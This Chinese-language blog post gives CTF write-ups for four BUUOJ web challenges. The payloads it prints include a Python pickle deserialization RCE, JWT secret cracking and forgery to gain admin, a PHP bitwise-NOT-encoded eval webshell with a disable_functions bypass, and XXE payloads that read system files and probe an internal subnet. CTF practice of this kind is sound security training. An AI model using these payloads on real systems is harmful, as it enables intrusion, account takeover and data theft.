---
title: BUUOJ刷题记录(2)
date: 2020-04-14
image: https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120170627.png
description: 
categories: 
- ctf_writeup
tags:
- JWT
- python反序列化
---
### [[CISCN2019 华北赛区 Day1 Web2\]ikun](https://buuoj.cn/challenges#[CISCN2019%20华北赛区%20Day1%20Web2]ikun)

考点：简单python脚本、逻辑漏洞、JWT破解与伪造、python反序列化

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120165729.png)

页面源码里面提示脑洞比较大，给了提示，如上图

目的是要买到LV6的东西，下面则是500页的商品，需要我们自行寻找。

在源码里面看到，每个商品的图片就是`lv?.png`那么我们推测lv6.png一定存在于某一页。

写一个脚本找找：

```
#by wh1sper
import requests

host = 'http://7d1e7948-30d9-42b8-b6e6-f74e7fc4a5eb.node3.buuoj.cn/shop?page='

for i in range(1,500):
    r = requests.get(url=host+str(i))
    if 'lv6.png' in r.text:
        print('page   =  ', i)
        break
```

得到181，访问之：

```
http://7d1e7948-30d9-42b8-b6e6-f74e7fc4a5eb.node3.buuoj.cn/shop?page=181
```

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120165739.png)

不出预料的买不起。。。

但是我们回头去看burp里面的数据包，发现请求体里面有一个键名为`discount=0.8`，改成`discount=0.00000000001`试试，果然可以，成功购买了lv6，页面重定向到 `/b1g_m4mber` 不过提示这个页面只能admin才能访问。于是我们又回过头去看请求头，发现cookie里面有一个东西叫做[JWT](https://www.cnblogs.com/cjsblog/p/9277677.html)（Json Web Token）

```
JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndoMXNwZXIifQ.Z3wlMUbdDHNs4x4PiVx43YD-CGibsHUC5f3ApnYId58
```

附上爆破工具GitHub地址：https://github.com/brendan-rius/c-jwt-cracker

```
root@kali:~/tools/JWTcrake/c-jwt-cracker-master# ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndoMXNwZXIifQ.Z3wlMUbdDHNs4x4PiVx43YD-CGibsHUC5f3ApnYId58
Secret is "1Kun"
root@kali:~/tools/JWTcrake/c-jwt-cracker-master#
```

在https://jwt.io/这个网站可以进行伪造，把身份改成admin。

我们就可以愉快的进行伪造了，打开F12->application->cookie,将JWT值改成：

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo
```

刷新之后我们就是admin啦~

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120165817.png)

ctrl+U查看源码，提示了`/static/asd1f654e683wq/www.zip`网站源码，

下载下来，发现是python的tornado框架编写的后端

在/sshop/views/Admin.py里面发现了python反序列化漏洞：

```
#by wh1sper
#Admin.py
import tornado.web
from sshop.base import BaseHandler
import pickle
import urllib


class AdminHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self, *args, **kwargs):
        if self.current_user == "admin":
            return self.render('form.html', res='This is Black Technology!', member=0)
        else:
            return self.render('no_ass.html')

    @tornado.web.authenticated
    def post(self, *args, **kwargs):
        try:
            become = self.get_argument('become')
            p = pickle.loads(urllib.unquote(become))
            return self.render('form.html', res=p, member=1)
        except:
            return self.render('form.html', res='This is Black Technology!', member=0)
```

第21行pickle.loads函数存在[python反序列化漏洞](https://www.dazhuanlan.com/2020/02/26/5e55c53a3403f/)

python中的类有一个`__reduce__`方法，类似与PHP中的`__wakeup__`，在反序列化的时候会自动调用。

- reduce它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。
  这个元组包含2到5个元素，其中包括：
  一个可调用的对象，用于重建对象时调用；
  一个参数元素，供那个可调用对象使用；
  被传递给 setstate 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）

 

看一个例子：

```
import pickle
import os
class A(object):
    def __reduce__(self):
        return (os.system,('ls',))
a = A()
test = pickle.dumps(a)
pickle.loads(test)
```

命令会被执行；

那么嫖一个exp：

```
#python2
# coding=utf8
import pickle
import urllib
import commands

class payload(object):
    def __reduce__(self):
        #return (commands.getoutput,('ls /',))
        return (commands.getoutput,('tac /flag.txt',))

a = payload()
print urllib.quote(pickle.dumps(a))
```

py2跑一下得到：

```
ccommands%0Agetoutput%0Ap0%0A%28S%27tac%20/flag.txt%27%0Ap1%0Atp2%0ARp3%0A.
```

抓包改become=（上面的），可以RCE

flag{922dd06c-d1e7-4550-b9fd-80332ff3bb87}

 

 

 

 

### [[MRCTF2020\]套娃](https://buuoj.cn/challenges#[MRCTF2020]套娃)

考点：PHP把.解析为_、JSfuck、data://协议的使用、逆向php算法

打开题目，源码里面提示：

```
$query = $_SERVER['QUERY_STRING'];

 if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
    die('Y0u are So cutE!');
}
 if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}
```

传值：`?b.u.p.t=23333%0A`，提示访问`secrettw.php `访问之后源码给了JSfuck，复制到控制台运行下得到“POST ME Merak”，post一个键名为Merak的任意值，得到源码：

```
Flag is here~But how to get it? 
<?php 
error_reporting(0); 
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';

if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 


function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo 'Local access only!'."<br/>";
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }
?>
```

`file_get_contents($_GET['2333'])`需要使用data协议，然后逆向上面的函数就行了

```
?2333=data://text/plain,todat+is+a+happy+day&file=ZmpdYSZmXGI=
```

这是脚本：

```
<?php

function change($v){
    $v = base64_decode($v);
    $re = '';
    for($i=0;$i<strlen($v);$i++){
        $re .= chr ( ord ($v[$i]) + $i*2 );
    }
    echo $re;
}
function re($re){
    $v = '';
    for($i = 0; $i < strlen($re); $i ++){
        $v .= chr( ord($re[$i]) - $i*2);
    }
    echo base64_encode($v),'   ';
    return base64_encode($v);
}

re('flag.php');
change(re('flag.php'));//验证
```

flag{4a0b1480-dcfa-4f59-aa4b-9db551ec653e}

 

 

 

### [[极客大挑战 2019\]RCE ME](https://buuoj.cn/challenges#[极客大挑战%202019]RCE%20ME)

考点：[php异或取反绕过正则](https://www.geek-share.com/detail/2779822280.html)、绕过disable_functions执行命令

先贴一篇：[>>PHP绕过正则的办法](https://blog.csdn.net/mochu7777777/article/details/104631142)

本来是比较难的一道题，看了wp做的，可以工具一把梭也可以手撸

送源码：

```
<?php
error_reporting(0);
if(isset($_GET['code'])){
            $code=$_GET['code'];
                    if(strlen($code)>40){
                                        die("This is too Long.");
                                                }
                    if(preg_match("/[A-Za-z0-9]+/",$code)){
                                        die("NO.");
                                                }
                    @eval($code);
}
else{
            highlight_file(__FILE__);
}

// ?>
```

看似很简单，其实学问多，

传入`?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo`可查看phpinfo；

能看到有很多disable_functions，版本为PHP7

构造shell连接蚁剑：

```
<?php 
  error_reporting(0);
  $a='assert';
  $b=urlencode(~$a);
  echo $b;
  echo "<br>";
  $c='(eval($_POST['aaa']))';
  $d=urlencode(~$c);
  echo $d;
?>
```

得到：

```
%9E%8C%8C%9A%8D%8B
%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%9E%9E%A2%D6%D6
```

playload

```
http://3494239d-8b3b-438f-9f91-21df2d0ffd65.node3.buuoj.cn/?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%9E%9E%A2%D6%D6);
密码aaa
```

可以得到一个不能执行命令的shell，

利用蚁剑的插件“绕过disable_functions”的PHP7_GC_UAF即可执行命令，运行根目录下的readflag就行

flag{a7900948-cbea-429d-972b-a959c52771be}

 

 

 

### [[NCTF2019\]True XML cookbook](https://buuoj.cn/challenges#[NCTF2019]True%20XML%20cookbook)

考点：XXE外部实体注入攻击、SSRF

吊把吊教我打web的🐏出的题，二刷的时候感觉自己今非昔比（大雾

[>>一篇文章带你理解XXE](https://xz.aliyun.com/t/3357)

这是签到题的升级版，本来是通过XXE读/flag文件的，升级版提示了“尝试用xxe做更多的事情”

读取`/etc/hosts`和`/proc/net/arp`

```
<?xml version="1.0"?>
<!DOCTYPE abc [
  <!ENTITY abc SYSTEM "/proc/net/arp">
]>
<user><username>&abc;</username><password>2</password></user>
```

得到返回信息：

```
<result><code>0</code><msg>IP address  HW type  Flags  HW address  Mask     Device
173.56.246.2     0x1         0x2         02:42:ad:38:f6:02     *        eth0
</msg></result>
```

不过原题是给了很多在一个C段下的ip，buu里面只给了两个。

然后可以通过xxe进行ssrf，这里可以用intruder进行C段爆破，最后是在`173.56.246.10`找到了flag

```
<?xml version="1.0"?>
<!DOCTYPE abc [
  <!ENTITY abc SYSTEM "php://filter/read=convert.base64-encode/resource=http://173.56.246.10/">
]>
<user><username>&abc;</username><password>2</password></user>
<result><code>0</code><msg>ZmxhZ3s4MGYzNGNhOS1kYmUxLTRmZWUtYjEyMi00Njk0NWRmYTQ1NGN9</msg></result>
```

flag{80f34ca9-dbe1-4fee-b122-46945dfa454c}